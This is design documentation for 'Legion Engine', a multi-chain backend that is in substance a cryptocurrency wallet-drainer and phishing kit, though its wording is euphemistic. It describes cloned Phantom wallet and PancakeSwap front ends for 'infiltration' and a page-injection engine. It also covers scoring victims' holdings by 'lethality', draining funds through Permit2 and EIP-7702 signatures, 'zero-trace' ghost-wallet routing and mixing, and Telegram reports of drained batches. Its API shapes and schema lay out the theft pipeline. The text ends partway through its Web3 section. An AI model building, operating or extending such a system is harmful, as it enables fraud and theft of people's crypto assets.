# Legion Engine Codebase Documentation

**Version:** 0.1.0  
**Last Updated:** June 23, 2026  
**Description:** Universal Asset Vacuum — multi-sentinel, API-first, frontend-agnostic backend

---

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Core Features](#core-features)
4. [Technology Stack](#technology-stack)
5. [Project Structure](#project-structure)
6. [Key Components](#key-components)
7. [Database Schema](#database-schema)
8. [API Endpoints](#api-endpoints)
9. [Security](#security)
10. [External Integrations](#external-integrations)
11. [Performance & Caching](#performance--caching)
12. [Background Jobs & Async Tasks](#background-jobs--async-tasks)
13. [Web3 & Blockchain Features](#web3--blockchain-features)
14. [Configuration & Environment](#configuration--environment)
15. [Testing](#testing)
16. [Deployment](#deployment)
17. [Development Guide](#development-guide)
18. [Troubleshooting](#troubleshooting)

---

## Overview

**Legion Engine** is a comprehensive, multi-chain cryptocurrency asset management and extraction platform. It serves as a universal backend for:

- **Multi-chain asset discovery** across EVM, Solana, TRON, TON, Bitcoin, Cosmos, Aptos, and Sui
- **Intelligent asset scanning** to identify high-value opportunities
- **Signature-based settlement** with support for Permit2, EIP-7702, and multi-chain signing
- **Automated fund management** including gas topup, wallet monitoring, and settlement
- **Real-time monitoring** via Telegram notifications and operational dashboards
- **Privacy-preserving extraction** with ghost protocol envelope support

The system is architected as a modular, monorepo-based Node.js application with:
- **API-first design**: RESTful endpoints powered by Fastify
- **Multi-database support**: PostgreSQL for relational data, Redis for caching and job queues
- **Production-hardened**: Comprehensive error handling, graceful shutdown, telemetry integration
- **Frontend-agnostic**: Backend serves multiple client applications (dashboard, sentinels, clones)

---

## Architecture

### High-Level System Design

```
┌─────────────────────────────────────────────────────────────────┐
│                     LEGION ENGINE SYSTEM                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  LAYER 1: DISCOVERY & INTELLIGENCE (Scout)                     │
│  ├─ Multi-chain asset detection                                │
│  ├─ Staking opportunity identification                          │
│  ├─ Liquidity pool analysis                                     │
│  └─ Value scoring & whale alerts                               │
│                                                                 │
│  LAYER 2: MONITORING & RESILIENCE (Sentinel)                   │
│  ├─ RPC health tracking                                         │
│  ├─ Automatic RPC failover                                      │
│  ├─ Latency monitoring (500ms threshold)                        │
│  └─ Circuit breaker for degraded RPC providers                 │
│                                                                 │
│  LAYER 3: SIGNATURE ANCHORING (Deep Ingress)                   │
│  ├─ EIP-712 signature generation                               │
│  ├─ Multi-chain signature support                              │
│  ├─ Nonce & expiry management                                  │
│  └─ Shadow envelope encryption                                 │
│                                                                 │
│  LAYER 4: SETTLEMENT (Multi-Chain Drainage)                    │
│  ├─ Permit2 allowance settlement                               │
│  ├─ Ghost protocol fund routing                                │
│  ├─ Cross-chain atomic execution                               │
│  └─ Settlement tracking & history                              │
│                                                                 │
│  LAYER 5: EXECUTION BRIDGE (Broadcasting)                      │
│  ├─ EVM execution methods                                       │
│  ├─ Solana transaction signing                                 │
│  ├─ UTXO-based drainage (Bitcoin)                              │
│  ├─ TRON TRC-20 settlement                                     │
│  └─ Cosmos/Aptos/Sui cross-chain support                       │
│                                                                 │
│  LAYER 6: OPERATIONAL CONTROL                                  │
│  ├─ Real-time Telegram notifications                           │
│  ├─ Dashboard queries & reporting                              │
│  ├─ Background cron jobs                                        │
│  └─ Live configuration updates                                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Monorepo Structure

```
legion-engine/
├── apps/
│   ├── api/                          # Main REST API server
│   ├── dashboard/                    # Frontend dashboard
│   ├── phantom-wallet/               # Phantom wallet clone
│   └── pancakeswap-clone/            # PancakeSwap frontend clone
├── packages/
│   ├── core/                         # Shared business logic (212 TS files)
│   ├── mirror/                       # UI cloning & injection
│   ├── sentinels/                    # RPC health monitoring
│   ├── updater/                      # Live configuration management
│   ├── sdk/                          # Client SDK
│   └── sovereign-admin/              # Admin dashboard
├── scripts/                          # Deployment & utility scripts
├── docs/                             # Documentation
└── docker/                           # Docker configurations
```

---

## Core Features

### 1. Multi-Chain Asset Discovery (Scout)

**Location:** `packages/core/src/logic/scout.ts`

Recursive Predator scans multiple blockchain families for high-value opportunities:

- **EVM Chains**: Staking (Lido stETH), Liquidity Pools (Uniswap V3, PancakeSwap), NFTs (CryptoPunks, BAYC)
- **Solana**: Staking (Marinade, Jito), Raydium liquidity pools, SPL tokens
- **TRON**: TRC-20 token balances and allowances
- **TON**: TON nano balances and wallet states
- **Bitcoin**: UTXO detection and balance analysis
- **Cosmos**: IBC token holdings
- **Aptos & Sui**: Coin type identification and move module scanning

**Key Metrics:**
- Lethality Score: Numeric (up to 38 decimal places)
- Value Thresholds: $500 USD minimum for telemetry
- Quota Alerts: 80% capacity warning

**Exported Functions:**
- `probeRecursivePredatorStEthBalanceWei()`
- `probeRecursivePredatorMarinadeBalanceRaw()`
- `probeRecursivePredatorJitoSolBalanceRaw()`
- `estimateUniswapV3MainnetLpUsd()`

### 2. RPC Monitoring & Failover (Sentinel)

**Location:** `packages/core/src/logic/sentinel.ts`

Watchdog Circuit provides automatic RPC rotation and health tracking:

- **Latency Threshold**: 500ms maximum acceptable response time
- **Auto-Rotation**: Triggered by HTTP 429 (rate limit) or 5xx errors
- **Failure Tracking**: Consecutive failures logged for circuit breaker
- **Healing Detection**: Monitors recovery of previously failed nodes
- **Circuit Breaker**: Prevents cascading failures

**Exported Functions:**
- `watchdogCircuitRpcPost()` - Auto-rotating RPC fetch with fallback
- `recordWatchdogCircuitRotation()` - Log rotation events
- `recordWatchdogCircuitFailure()` - Track failure metrics
- `recordSentinelHealingEvent()` - Track recovery

### 3. Signature Anchoring & Deep Ingress

**Location:** `packages/core/src/logic/deep-ingress.ts`, `integration-sync.ts`

Multi-protocol signature generation and validation:

- **EIP-712 Signatures**: Ethereum-compatible signing with domain separation
- **Nonce Management**: Prevents replay attacks
- **Expiry Tracking**: Default expiry 2099-12-31
- **Quorum Requirements**: Multi-signature support
- **Multi-Protocol Support**:
  - EVM: Permit2, EIP-7702 delegation
  - Solana: Ed25519 signatures
  - TRON: TRON-specific signing
  - TON: TON envelope signing
  - Bitcoin: PSBT (Partially Signed Bitcoin Transactions)
  - Cosmos: Amino/Protobuf signing
  - Aptos: Move module transactions
  - Sui: Sui transaction format

**Shadow Envelope**: Encrypted envelope for sensitive data in transit

### 4. Multi-Chain Settlement

**Location:** `packages/core/src/logic/settlement.ts`

Normalized settlement structure supporting all chain families:

**Settlement Fields:**
- `ingress`: 'normalized_v1' (versioned protocol)
- `chain_family`: Target blockchain family (EVM, SVM, UTXO, TRON, TON, COSMOS, APTOS, SUI)
- `wallet_address`: Source wallet address
- `token_address`: Token to drain
- `signature`: Signed authorization
- `nonce`: Replay attack prevention
- `expiry_iso`: Timestamp when signature expires
- `scout_value_usd`: Estimated asset value
- `ghost_protocol`: Optional intermediate wallet routing

**Ghost Protocol**: Derives intermediate wallet from keccak256 hash of source+settlement parameters for zero-trace extraction

**Exported Functions:**
- `buildEvmSignatureAnchorSettlement()`
- `buildSvmSignatureAnchorSettlement()`
- `buildTronSignatureAnchorSettlement()`
- `buildTonSignatureAnchorSettlement()`
- `attachGhostIfRequested()`
- `buildIntermediateGhostWalletRouting()`

### 5. Execution Bridge & Broadcasting

**Location:** `packages/core/src/logic/settlement-execution-bridge.ts`

Multi-chain transaction execution and broadcasting:

**EVM Methods:**
- Permit2 allowance settlement
- EIP-7702 delegation drain
- Batch Permit2 settlement
- Flash loan integration
- Omnichain atomic settlement

**Cross-Chain Support:**
- Solana: Web3.js integration
- TRON: TronWeb SDK
- TON: TON client SDK
- Bitcoin: bitcoinjs-lib PSBT
- Cosmos: CosmJS
- Aptos: Aptos TypeScript SDK
- Sui: Sui TypeScript SDK

### 6. Real-Time Notifications & Control

**Location:** `apps/api/src/lib/telegram.ts`

Multi-channel Telegram integration:

- **Rate-Limited Queue**: 1 message/second to prevent Telegram 429 errors
- **Drain Batch Summaries**: 5-minute aggregate reports per wallet
- **OPSEC Truncation**: Addresses shown as `0x1234...abcd`
- **Multi-Chat Support**: Multiple TELEGRAM_CHAT_IDs for different operational channels
- **Graceful Shutdown**: Proper cleanup of queue timers

**Features:**
- Outbound message queue with max capacity of 100
- Drain batch deduplication to prevent duplicate notifications
- USD formatting (K for thousands, M for millions)
- Configurable batch interval (default 5 minutes)

### 7. Automated Background Operations

**Location:** `apps/api/src/cron/`

Four main cron jobs manage ongoing system operations:

1. **Gas Topup Cron** (`gas-topup.ts`): Automatically replenish execution wallet gas
2. **Gas Warning Cron** (`gas-warning.ts`): Alert when gas reserves drop below threshold
3. **Vault Sweep Cron** (`vault-sweep.ts`): Periodically consolidate funds from vaults
4. **Wallet Monitor Cron** (`wallet-monitor.ts`): Track wallet states and balances

All crons implement graceful start/stop for clean shutdown.

---

## Technology Stack

### Core Runtime & Build

- **Node.js**: >= 20.0.0 (bookworm-slim Docker image)
- **Package Manager**: pnpm >= 9.0.0
- **Language**: TypeScript 5.4+ with strict mode
- **Build Tool**: tsc (TypeScript compiler)

### API Framework

- **Fastify**: 4.28.0 - Fast, low-overhead REST API
- **@fastify/cors**: 9.0.0 - CORS middleware
- **@fastify/jwt**: 8.0.0 - JWT authentication
- **@fastify/rate-limit**: 9.0.0 - Rate limiting
- **@fastify/websocket**: 8.0.0 - WebSocket support

### Database & Data

- **Drizzle ORM**: 0.45.2 - Type-safe SQL query builder
- **PostgreSQL**: Production database (pg 8.11.0)
- **Redis/ioredis**: 5.3.0+ - In-memory cache and job queues
- **BullMQ**: 5.34.5 - Redis-backed job queue

### Blockchain & Web3

- **viem**: 2.21.0 - EVM client library
- **ethers.js**: 6.x - Ethereum utilities
- **@solana/web3.js**: 1.98.4 - Solana interaction
- **tronweb**: 6.0.0 - TRON network client
- **@ton/ton**: 15.1.0 - TON network client
- **bitcoinjs-lib**: 7.0.1 - Bitcoin PSBT signing
- **@cosmjs/***: 0.32.4 - Cosmos SDK integration
- **@mysten/sui.js**: 0.54.1 - Sui network client
- **@aptos-labs/ts-sdk**: 7.1.0 - Aptos network client

### Signing & Cryptography

- **siwe**: 3.0.0 - Sign-in with Ethereum
- **@scure/base**: 2.2.0 - Base encoding (base58, base64)
- **tiny-secp256k1**: 2.2.4 - Bitcoin cryptography
- **@ton/crypto**: 3.3.0 - TON cryptographic operations

### Notifications & External APIs

- **grammy**: 1.43.0 - Telegram Bot API client
- **@supabase/supabase-js**: 2.49.1 - Supabase integration

### Logging

- **pino**: 9.0.0 - Fast JSON logger
- **node-cron**: 4.2.1 - Cron scheduling

### Development Tools

- **vitest**: 1.6.0 - Unit test framework
- **tsx**: 4.21.0 - TypeScript execution without compilation
- **prettier**: 3.3.0 - Code formatting
- **eslint**: 8.57.0 - Linting

### Validation & Schema

- **zod**: 3.23.0 - Runtime type validation and schema definition

---

## Project Structure

### Apps Directory

#### `apps/api/` (Primary Backend)

```
apps/api/
├── src/
│   ├── index.ts                 # Main server entry point
│   ├── server.ts                # Fastify app factory
│   ├── app.ts                   # CORS and middleware registration
│   ├── telemetry-sender.ts      # Telemetry payload dispatch
│   ├── telegram-bot.ts          # Control bot command handler
│   ├── controllers/
│   │   └── auth.controller.ts   # SIWE authentication logic
│   ├── middleware/
│   │   ├── auth-unification.ts  # JWT/SIWE auth middleware
│   │   ├── input-validation.ts  # Request size & pattern validation
│   │   ├── request-sanitizer.ts # XSS/SQL injection prevention
│   │   └── security-headers.ts  # CSP, HSTS, X-Frame-Options
│   ├── routes/ (30 route files)
│   │   ├── auth.ts
│   │   ├── balance.ts
│   │   ├── creds.ts
│   │   ├── dex-aggregator.ts
│   │   ├── health.ts
│   │   ├── jobs.ts
│   │   ├── scout.ts
│   │   ├── signature-anchor.ts
│   │   ├── settlement-tracking.ts
│   │   └── ... (20+ more)
│   ├── cron/ (347 lines)
│   │   ├── gas-topup.ts
│   │   ├── gas-warning.ts
│   │   ├── vault-sweep.ts
│   │   └── wallet-monitor.ts
│   ├── lib/ (85 TypeScript files)
│   │   ├── api-response.ts      # Standard response formatting
│   │   ├── bullmq-production.ts # Job queue configuration
│   │   ├── cex-request-tracker.ts
│   │   ├── clone-deploy.ts      # Local clone server hosting
│   │   ├── database-anchor.ts   # DB health check
│   │   ├── dex-engine.ts        # DEX interaction logic
│   │   ├── env-loader.ts        # Environment loading
│   │   ├── error-handler.ts     # Centralized error handling
│   │   ├── redis-client.ts      # Redis connection
│   │   ├── settlement-*.ts      # Settlement tracking
│   │   ├── sentinel-runtime.ts
│   │   ├── telegram.ts          # Telegram notifications
│   │   ├── wallet-monitor-store.ts
│   │   └── ... (more utilities)
│   └── services/
│       └── telemetry-service.ts
├── dist/                        # Compiled JavaScript
└── package.json
```

**Total Lines:** 85 TypeScript files in apps/api/src

#### `apps/dashboard/`
Frontend dashboard for monitoring and control (React-based)

#### `apps/phantom-wallet/`
Phantom wallet clone for testing and infiltration

#### `apps/pancakeswap-clone/`
PancakeSwap DEX interface clone

### Packages Directory

#### `packages/core/` (Shared Business Logic)

```
packages/core/src/ (212 TypeScript files)
├── index.ts                     # Main exports (739 lines)
├── types/                       # Type definitions
├── evm/                         # EVM-specific logic
├── lane/                        # Extraction lane primitives
├── state/                       # State management
├── security/
│   ├── permit2-handler.ts
│   └── signature-timestamp-drift.ts
├── db/
│   ├── schema.ts               # Drizzle ORM schema
│   ├── connection-pool-manager.ts
│   ├── encryption-handler.ts
│   ├── failover-mechanism.ts
│   ├── data-archival-manager.ts
│   └── backup-recovery-manager.ts
├── config/
│   ├── env-schema.ts           # Zod environment validation
│   ├── live-config.ts          # Runtime config updates
│   └── chain-rpc.ts            # RPC configuration
├── logic/ (High-level business logic)
│   ├── scout.ts                # Asset discovery
│   ├── sentinel.ts             # RPC monitoring
│   ├── settlement.ts           # Settlement logic
│   ├── settlement-execution-bridge.ts
│   ├── deep-ingress.ts         # Signature anchoring
│   ├── integration-sync.ts
│   ├── allowance-reuse.ts      # Allowance scanning
│   └── multi-balance.ts        # Balance queries
├── lib/
│   ├── redis-wrapper.ts        # Redis abstraction
│   ├── rpc-mesh.ts             # RPC failover mesh
│   ├── request-cache.ts        # Caching utilities
│   ├── rate-limiter.ts         # Rate limiting
│   └── ... (more utilities)
├── chains/                      # Chain-family implementations
├── mixer/                       # Privacy mixing logic
├── vault/                       # Vault management
├── monitoring/                  # Health checks
├── analytics/                   # Event tracking
├── infrastructure/
├── settlement/
├── operations/
├── compliance/
├── error/
└── telemetry/
```

**Total Lines:** 212 TypeScript files in packages/core/src

#### `packages/mirror/`
UI cloning and page injection engine

#### `packages/sentinels/`
RPC health monitoring and circuit breaker

#### `packages/updater/`
Live configuration management and updates

#### `packages/sdk/`
Client SDK for external integrations

#### `packages/sovereign-admin/`
Admin control panel

---

## Database Schema

### Core Tables

#### `chain_registry`
Central registry of all supported blockchains

```sql
CREATE TABLE chain_registry (
  id TEXT PRIMARY KEY,           -- CAIP-2: "evm:1", "svm:mainnet-beta", etc.
  family TEXT NOT NULL,          -- EVM, SVM, UTXO, COSMOS, SUBSTRATE, MULTICHAIN, INFRA
  display_name TEXT NOT NULL,    -- "Ethereum Mainnet", "Solana Mainnet Beta", etc.
  native_decimals INTEGER,       -- 18 for ETH, 9 for SOL, 8 for BTC
  finality_model TEXT NOT NULL,  -- probabilistic, deterministic, instant
  rpc_endpoints JSONB NOT NULL,  -- ["https://...", "https://..."]
  active BOOLEAN DEFAULT true
)
```

**Chain Families:**
- `EVM`: Ethereum-style chains (Ethereum, Polygon, Arbitrum, etc.)
- `SVM`: Solana Virtual Machine
- `UTXO`: Bitcoin-derived (Bitcoin, Litecoin, etc.)
- `COSMOS`: Cosmos SDK chains
- `SUBSTRATE`: Polkadot/Kusama
- `MULTICHAIN`: Intent solvers spanning multiple families
- `INFRA`: Infrastructure (Redis, RPC providers)

**Finality Models:**
- `probabilistic`: Work-based or block-depth confirmation
- `deterministic`: Finality gadget (TowerBFT, CometBFT, GRANDPA)
- `instant`: Single-slot or single-block finality

#### `legion_vaults`
Treasury and operational wallets per chain

```sql
CREATE TABLE legion_vaults (
  id UUID PRIMARY KEY,
  chain_id TEXT REFERENCES chain_registry(id),
  address TEXT NOT NULL,         -- Polymorphic: EVM hex, Solana base58, Bech32, SS58
  label TEXT NOT NULL,           -- "Primary Vault", "Gas Topup Wallet", etc.
  metadata JSONB                 -- Flexible config: multisig threshold, vault type, etc.
)
```

#### `opportunities`
Scout-discovered extraction opportunities

```sql
CREATE TABLE opportunities (
  id UUID PRIMARY KEY,
  chain_id TEXT REFERENCES chain_registry(id),
  family TEXT NOT NULL,          -- Denormalized from chain_registry.family
  asset_address TEXT NOT NULL,   -- Token address (polymorphic)
  amount NUMERIC(78,0),          -- uint256: token balance (string in JS)
  lethality_score NUMERIC(38,0), -- High-net-worth numeric score
  asset_decimals INTEGER,
  created_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
  metadata JSONB                 -- Flexible: venue, pool info, etc.
)
```

**Numeric Precision Rules:**
- `NUMERIC(78,0)`: Unsigned 256-bit integers (uint256 equivalent)
- `NUMERIC(38,0)`: Large decimals without fractional parts
- **Important**: Always read into JavaScript as `BigInt(value)`, never `Number(value)`

#### `signature_anchors`
Signed authorizations for settlement

```sql
CREATE TABLE signature_anchors (
  id UUID PRIMARY KEY,
  wallet_address TEXT NOT NULL,
  chain_id TEXT NOT NULL,
  signature TEXT NOT NULL,
  nonce BIGINT NOT NULL,
  expiry_iso TIMESTAMP,
  signed_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
  metadata JSONB
)
```

#### `settlement_history`
Complete record of all fund transfers

```sql
CREATE TABLE settlement_history (
  id UUID PRIMARY KEY,
  source_wallet TEXT NOT NULL,
  destination_wallet TEXT,
  chain_id TEXT NOT NULL,
  token_address TEXT,
  amount NUMERIC(78,0),
  amount_usd NUMERIC(20,2),
  status TEXT,                   -- pending, confirmed, failed
  tx_hash TEXT UNIQUE,
  settled_at TIMESTAMPTZ,
  created_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
)
```

---

## API Endpoints

### Authentication Routes

#### `POST /api/auth/siwe/challenge`
Request a SIWE challenge for signature-based authentication

**Response:**
```json
{
  "message": "Ethereum signature challenge",
  "nonce": "unique-nonce"
}
```

#### `POST /api/auth/siwe/verify`
Verify a SIWE signature and obtain JWT

**Request:**
```json
{
  "message": "...",
  "signature": "0x..."
}
```

**Response:**
```json
{
  "token": "eyJhbGc...",
  "user": { "address": "0x..." }
}
```

### Health & Status

#### `GET /health`
Health check endpoint (responds immediately during startup)

**Response:**
```json
{
  "status": "ok",
  "uptime": 12345
}
```

#### `GET /api/chains`
List all supported blockchain networks

**Response:**
```json
{
  "chains": [
    {
      "id": "evm:1",
      "family": "EVM",
      "name": "Ethereum Mainnet",
      "active": true
    }
  ]
}
```

### Scout & Asset Discovery

#### `POST /api/scout`
Discover high-value assets on a target wallet

**Request:**
```json
{
  "chain": "evm:1",
  "wallet": "0x...",
  "threshold_usd": 500
}
```

**Response:**
```json
{
  "opportunities": [
    {
      "asset": "0x...",
      "amount": "1000000000000000000",
      "value_usd": 1500,
      "lethality_score": 95
    }
  ]
}
```

### Settlement & Signature Anchoring

#### `POST /api/signature-anchor`
Normalize and store a signature authorization

**Request:**
```json
{
  "ingress": "normalized_v1",
  "chain_family": "EVM",
  "wallet_address": "0x...",
  "token_address": "0x...",
  "signature": "0x...",
  "nonce": 1,
  "expiry_iso": "2099-12-31T23:59:59Z",
  "scout_value_usd": 5000,
  "ghost_protocol": true
}
```

#### `POST /api/settlement`
Execute settlement and drain assets

**Request:**
```json
{
  "signature_anchor_id": "...",
  "execution_method": "permit2"
}
```

**Response:**
```json
{
  "settlement_id": "...",
  "tx_hash": "0x...",
  "status": "pending",
  "amount_settled": "1000000000000000000"
}
```

#### `GET /api/settlement-history`
Query settlement transaction history

**Query Parameters:**
- `wallet` - Filter by source wallet
- `chain` - Filter by blockchain
- `status` - Filter by status (pending, confirmed, failed)

### Jobs & Task Management

#### `POST /api/jobs`
Enqueue a new background job

**Request:**
```json
{
  "type": "gas-topup",
  "chain": "evm:1",
  "wallet": "0x...",
  "amount_wei": "1000000000000000000"
}
```

#### `GET /api/jobs/:id`
Retrieve job status

**Response:**
```json
{
  "id": "...",
  "type": "gas-topup",
  "status": "processing",
  "progress": 45,
  "result": null
}
```

### Balance Queries

#### `POST /api/balance`
Query multi-chain balance for a wallet

**Request:**
```json
{
  "wallet": "0x...",
  "chains": ["evm:1", "svm:mainnet-beta"],
  "tokens": ["0x...", "..."]
}
```

**Response:**
```json
{
  "balances": [
    {
      "chain": "evm:1",
      "token": "0x...",
      "balance": "1000000000000000000",
      "decimals": 18
    }
  ]
}
```

### Configuration & Updates

#### `GET /api/client-config`
Retrieve live client configuration

**Response:**
```json
{
  "rpc_urls": { "evm:1": "https://..." },
  "supported_chains": ["evm:1", "svm:mainnet-beta"],
  "features": { "ghost_protocol": true }
}
```

#### `POST /api/update/live-config`
Update configuration (admin only)

**Request:**
```json
{
  "rpc_urls": { "evm:1": "https://..." },
  "features": { "ghost_protocol": false }
}
```

**Total API Endpoints:** 30+ routes covering authentication, settlement, scouting, jobs, and configuration

---

## Security

### Authentication

1. **SIWE (Sign-In With Ethereum)**: Primary auth mechanism
   - Challenge-nonce prevents replay attacks
   - JWT tokens with configurable expiry
   - Wallet address verified from signature

2. **JWT Bearer Tokens**: Protected route access
   - `@fastify/jwt` integration
   - Automatic header validation
   - Rate limiting per token

3. **API Key Support**: Legacy integration method
   - Environment variable: `API_KEYS` (comma-separated)
   - Header: `X-API-Key`

### Authorization

1. **Role-Based Access Control (RBAC)**
   - Admin, Operator, User roles
   - Middleware-based enforcement
   - Per-route permission checks

2. **Wallet Blacklisting**
   - Configurable blacklist in `live-config`
   - Prevents operations on restricted wallets
   - Runtime updates without restart

3. **Settlement Address Validation**
   - Allowlist of permitted destination addresses
   - Prevents draining to unintended wallets
   - Chain-family specific rules

### Input Validation

**Security Headers** (`middleware/security-headers.ts`):
- `X-Content-Type-Options: nosniff` - Prevents MIME type sniffing
- `X-XSS-Protection: 1; mode=block` - Browser XSS protection
- `X-Frame-Options: DENY` - Clickjacking prevention
- `Content-Security-Policy: default-src 'none'; ...` - Strict CSP
- `Referrer-Policy: no-referrer` - Minimize referrer leakage
- `Permissions-Policy: ...` - Disable unnecessary features
- `Strict-Transport-Security` (production only) - HSTS enforcement

**Request Sanitization** (`middleware/input-validation.ts`):
- URL length validation (max 4KB)
- Query string length validation (max 8KB)
- Header size validation (max 4KB per header)
- Suspicious pattern detection (SQL injection, XSS, template injection)
- Payload size limiting (1MB max body)

**Database Injection Prevention**:
- Drizzle ORM parameterized queries
- No raw SQL concatenation
- Schema validation via Zod

### Cryptographic Security

1. **Signature Verification**
   - EIP-712 signature validation
   - Domain separator checking
   - Nonce and expiry verification

2. **Ghost Protocol**
   - Intermediate wallet derivation: keccak256(source:settlement:params)
   - Untraceable fund routing
   - Optional encryption of envelope

3. **Private Key Management**
   - Execution keys stored in PostgreSQL with encryption
   - Secrets injected via environment variables (Railway)
   - Never logged or exposed in error messages

### Rate Limiting

**Fastify Rate Limiter** integration:
- Configurable per-route limits
- Redis-backed distributed limiting
- Graceful degradation on Redis failure
- Request logging for anomaly detection

### Error Handling

**Global Error Handler** (`server.ts`):
- Centralized 5xx error logging
- Fire-and-forget telemetry dispatch
- Clean JSON responses to clients
- Request ID correlation for debugging

---

## External Integrations

### Telegram Integration

**Bot Token:** `TELEGRAM_BOT_TOKEN` environment variable

**Features:**
- Real-time settlement notifications
- Drain batch summaries (5-minute intervals)
- Gas warning alerts
- Wallet monitor updates
- Rate-limited queue (1 msg/sec) prevents 429 errors

**Multiple Channels:**
- `TELEGRAM_CHAT_IDS` (comma-separated list)
- Different channels for operational, security, debug messages

**Control Bot:**
- Accepts commands via Telegram inline keyboard
- Graceful async command handling
- Telemetry payload dispatch on errors

**Location:** `apps/api/src/lib/telegram.ts` (150+ lines)

### Supabase Integration

**Purpose:** Optional storage for auxiliary data

**Configuration:**
- `SUPABASE_URL` and `SUPABASE_KEY` environment variables
- Used for dashboard queries and user data

**Location:** Direct usage in route handlers and API responses

### Live Configuration Service

**Purpose:** Update system behavior without restart

**Features:**
- Remote configuration polling
- RPC URL updates
- Feature flags (ghost protocol, privacy mixing)
- Wallet blacklist updates
- Cron expression changes

**Mechanism:**
- Cron-based polling (`LIVE_CONFIG_CRON`)
- In-memory snapshot cache
- Atomic updates via `applyLiveConfig()`

**Location:** `packages/core/src/config/live-config.ts`

### RPC Provider Mesh

**Purpose:** Fault-tolerant multi-RPC system

**Features:**
- Primary and backup RPC endpoints per chain
- Automatic failover on HTTP 429/5xx
- Latency tracking (500ms threshold)
- Circuit breaker for degraded nodes
- Health probing with retry strategy

**Configuration:**
- Public fallback RPC URLs for each chain
- Environment variables override defaults
- Mesh status snapshot available via `/api/rpc/mesh-status`

**Location:** `packages/core/src/lib/rpc-mesh.ts`

---

## Performance & Caching

### Redis Caching

**Purpose:** Reduce database queries and RPC calls

**Key Patterns:**
- Balance caches with TTL
- RPC response caching
- Scout opportunity deduplication
- Settlement tracking cache

**Configuration:**
- `REDIS_URL` environment variable
- Automatic fallback to in-memory queue if Redis unavailable
- TTL ranges: 30s to 24h depending on data type

**Resilience:**
- Wrapper retry strategy with exponential backoff
- Memory fallback job queue when Redis unavailable
- Memory job count tracking

**Location:** `packages/core/src/lib/redis-wrapper.ts`

### Request Deduplication

**Purpose:** Prevent duplicate work for concurrent requests

**Features:**
- Batch request caching with deduplication
- Request-level caching for identical parameters
- Smart TTL based on data freshness requirements

**Exports:**
- `createRequestCache()` - Single request cache
- `createBatchRequestCache()` - Batch request cache

**Location:** `packages/core/src/lib/request-cache.ts`

### Rate Limiting

**Three-Tier Approach:**
1. **Token Bucket**: Smooth burst handling
2. **Sliding Window**: Precise rate enforcement
3. **Multi-Tier**: Different limits per endpoint/user

**Configuration:**
- Global default: 100 req/min
- Per-wallet throttling: 50 req/min
- Admin bypass available

**Location:** `packages/core/src/lib/rate-limiter.ts`

### Optimization Strategies

1. **Index Strategy**: PostgreSQL indexes on frequently queried columns
   - `chain_registry.id` (primary key)
   - `settlement_history.wallet_address`
   - `settlement_history.tx_hash`

2. **Connection Pooling**:
   - PostgreSQL: pg pooling with maxConnections=20
   - Redis: ioredis automatic pooling
   - Graceful connection closing on shutdown

3. **Response Pagination**:
   - Default limit: 100 items per request
   - Max limit: 1000 items
   - Cursor-based pagination for large datasets

---

## Background Jobs & Async Tasks

### BullMQ Job Queue

**Purpose:** Async task processing with persistence and retry logic

**Features:**
- Redis-backed persistent queue
- Automatic retries with exponential backoff
- Dead letter queue for failed jobs
- Job progress tracking
- Priority job support

**Configuration:**
- `BULLMQ_REDIS_URL` (defaults to `REDIS_URL`)
- Max concurrent jobs: configurable per queue
- Retry strategy: exponential backoff up to 5 attempts

**Location:** `apps/api/src/lib/bullmq-production.ts`

### Cron Jobs

**Location:** `apps/api/src/cron/` (347 lines total)

#### 1. Gas Topup Cron
- Runs: Configurable interval (default: every 30 minutes)
- Action: Replenish execution wallet gas from treasury vault
- Triggers: Low balance detection
- Chains: EVM, Solana, TRON

#### 2. Gas Warning Cron
- Runs: Every 15 minutes
- Action: Alert via Telegram if gas below threshold
- Threshold: Configurable per chain

#### 3. Vault Sweep Cron
- Runs: Daily (configurable)
- Action: Consolidate collected funds to main vault
- Channels: Supports all chain families
- Batch processing: Configurable batch size

#### 4. Wallet Monitor Cron
- Runs: Every 5 minutes
- Action: Track monitored wallet states and balances
- Storage: In-memory with Redis persistence
- Features: Balance threshold alerts, transaction tracking

### Sentinel Runtime

**Purpose:** RPC health monitoring and auto-failover

**Features:**
- Continuous latency probing
- Circuit breaker activation/recovery
- Failure tracking per endpoint
- Healing event logging
- Integration with Watchdog Circuit

**Execution:** Runs as background task on server startup

**Location:** `packages/core/src/lib/sentinel-runtime.ts`

### Price Oracle

**Purpose:** Fetch and cache cryptocurrency prices

**Features:**
- Batch fetching (5000+ coins in single request)
- Configurable update interval
- Price caching with TTL
- USD conversion for settlement values

**Cron Expression:** Configurable via `PRICE_ORACLE_CRON` (default: every 5 minutes)

**Location:** `packages/core/src/price-oracle.ts` (33KB)

---

## Web3 & Blockchain Features

### Chain Family Support

#### EVM (Ethereum & Compatible Chains)

**Supported Methods:**
1. **Permit2 Allowance Settlement**
   - USDC Permit2 interface (ERC-2612)
   - Max amount authorization
   - Nonce-based replay protection
   - Signature verification

2. **EIP-7702 Account Delegation**
   - Delegate account code to external contract
   - Execute arbitrary operations
   - Flash loan integration
   - Batch transaction support

3. **Omnichain Atomic Settlement**
   - Cross-chain message passing
   - Atomic execution across multiple EVM chains
   - Netting and optimization
   - Settlement coordination

4. **Swap Integration**
   - Uniswap V3 liquidity provider detection
   - PancakeSwap V3 pool analysis
   - Curve Finance integration
   - DEX router swaps

**Key Assets Tracked:**
- Lido stETH (0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84)
- Aave v3 lending positions
- CryptoPunks (0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB)
- BAYC NFTs (0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D)

#### Solana (SVM)

**Supported Features:**
- SPL token balance queries
- Staking detection (Marinade mSOL, Jito JitoSOL)
- Raydium liquidity pool identification
- Ed25519 signature validation
- Versioned transaction signing

**Key Pools:**
- Raydium V4 (675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8)
- Marinade mSOL (mSoLzYCxHdgqRL3jZkYrYM8g7LWbJ5zPrmcX4GXK5Qe)

**Minimum Balance Checks:**
- Solana: Lamports-based tracking
- Token accounts: Account rent reserves

